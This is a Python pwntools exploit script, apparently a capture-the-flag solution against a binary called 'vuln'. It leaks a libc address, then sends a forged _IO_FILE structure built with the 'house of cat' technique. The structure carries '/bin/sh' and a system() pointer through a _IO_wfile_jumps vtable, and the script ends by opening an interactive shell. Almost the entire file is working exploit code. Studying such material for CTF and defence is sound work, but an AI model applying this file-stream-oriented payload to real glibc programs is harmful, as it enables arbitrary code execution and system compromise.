from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 1
gdb_is = 0
elf_path = "./vuln"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if gdb_is:
        r = gdb.debug('./vuln','set debug-file-directory ./.debug/')
        # gdb.attach(r,'b* 0x4012ed')
        # gdb.attach(r)
        # pause()
        pass
    else:
        r = process("./vuln")
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0



def show_addr(name,addr):
      success(f'{name} = {hex(addr)}')

def revc_addr(r:process,name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str ='bytes')->int:
    if type(until) == str:
        until = until.encode()
    if addrType == 'bytes':
        if not offset:
            addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
        else:
            addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
    elif addrType == 'str':
        addr = int(r.recvuntil(until)[2:offset],16)

    show_addr(name,addr)
    return addr
    
libc = ELF('./libc.so.6')
elf = ELF(elf_path)
rop = ROP(elf)
r.recvuntil(b'the box of it looks like this: ')
libc.address = revc_addr(r,b'_IO_list_all','\n',-1,'str') - 0x1f7660
size = 0x20000000


r.sendlineafter(b'put into the gift?\n',str(size).encode())
show_addr('libc.address',libc.address)

# pause()
# house_of_cat
fake_io_addr = libc.address - 0x20003ff0 # 伪造的fake_IO结构体的地址
show_addr('fake_io_addr',fake_io_addr)
next_chain = 0

fake_IO_FILE=b'/bin/sh\x00'         #0x0   _flags => rdi
fake_IO_FILE+=p64(0)                #0x8   _IO_read_ptr
fake_IO_FILE+=p64(0)                #0x10  _IO_read_end
fake_IO_FILE+=p64(0)                #0x18  _IO_read_base
fake_IO_FILE+=p64(0)                #0x20  _IO_write_base
fake_IO_FILE+=p64(1)                #0x28  _IO_write_ptr
fake_IO_FILE+=p64(0)                #0x30  _IO_write_end
fake_IO_FILE+=p64(0)                #0x38  _IO_buf_base
fake_IO_FILE+=p64(0)                #0x40  _IO_buf_end
fake_IO_FILE+=p64(0)                #0x48  _IO_save_base
fake_IO_FILE+=p64(0x100)            #0x50  _IO_backup_base
fake_IO_FILE+=p64(0)                #0x58  _IO_save_end
fake_IO_FILE+=p64(0)                #0x60  _markers
fake_IO_FILE+=p64(0)                #0x68  _chain
fake_IO_FILE+=b'\x00'*4             #0x70  _fileno
fake_IO_FILE+=b'\x00'*4             #0x74  _flags2
fake_IO_FILE+=p64(0)                #0x78  _old_offset
fake_IO_FILE+=b'\x00\x00'           #0x80  _cur_column
fake_IO_FILE+=b'\x00'               #0x82  _vtable_offset
fake_IO_FILE+=b'\x00'*5             #0x83  _shortbuf
fake_IO_FILE+=p64(fake_io_addr+0x1000)                #0x88  _lock
fake_IO_FILE+=p64(0)                #0x90  _offset
fake_IO_FILE+=p64(0)                #0x98  _codecvt
fake_IO_FILE+=p64(fake_io_addr+0x30)#0xa0  _wide_data       rax1 fake_io_addr+0x30
fake_IO_FILE+=p64(0)                #0xa8  _freeres_list
fake_IO_FILE+=p64(0)                #0xb0  _freeres_bufr
fake_IO_FILE+=p64(0)                #0xb8  __pad5
fake_IO_FILE+=b'\x00\x00\x00\x00'   #0xc0  _mode           rdx
fake_IO_FILE+=b'\x00\x00\x00\x00'+ p64(0) * 2 #0xc4  _unused2
fake_IO_FILE+=p64(libc.sym['_IO_wfile_jumps'] + 0x30)       #0xd8  vtable
fake_IO_FILE+=p64(fake_io_addr+0x30+0xe0+0x40).rjust(0x38,b'\x00')                             #0xe0
fake_IO_FILE+=p64(libc.sym['system']).rjust(0x58,b'\x00')


pause()

r.sendafter(b'What do you think is appropriate to put into the gitf?\n',fake_IO_FILE)
r.interactive()